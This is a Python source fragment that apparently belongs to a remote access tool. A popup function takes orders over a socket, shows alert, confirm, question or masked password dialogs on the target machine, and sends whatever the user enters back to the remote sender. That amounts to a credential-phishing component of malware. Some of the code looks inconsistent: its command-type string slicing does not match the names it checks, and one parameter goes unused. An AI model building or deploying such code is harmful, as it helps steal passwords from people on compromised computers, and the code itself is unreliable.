import socket
from time import sleep


def popup(conn: socket.socket, command: str) -> None:
    from pymsgbox import alert, confirm, prompt, password
    parts = command.strip().split("|")
    if len(parts) < 2:
        return

    cmd_type = parts[0][2:8]
    if cmd_type == "alert":
        alert(parts[2], parts[1])
    elif cmd_type == "confr":
        buttons = parts[3].split(",") if len(parts) > 3 else []
        result = confirm(text=parts[2], title=parts[1], buttons=buttons)
        conn.send(result.encode())
    elif cmd_type == "qstion":
        result = prompt(text=parts[2], title=parts[1])
        conn.send(result.encode())
    elif cmd_type == "passwd":
        result = password(text=parts[2], title=parts[1], mask="*")
        conn.send(result.encode())


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    while True:
        sleep(0.25)
        try:
            if command.startswith("WN"):
                popup(conn, command)
                conn.send(b"END")
                break
            else:
                break
        except Exception:
            break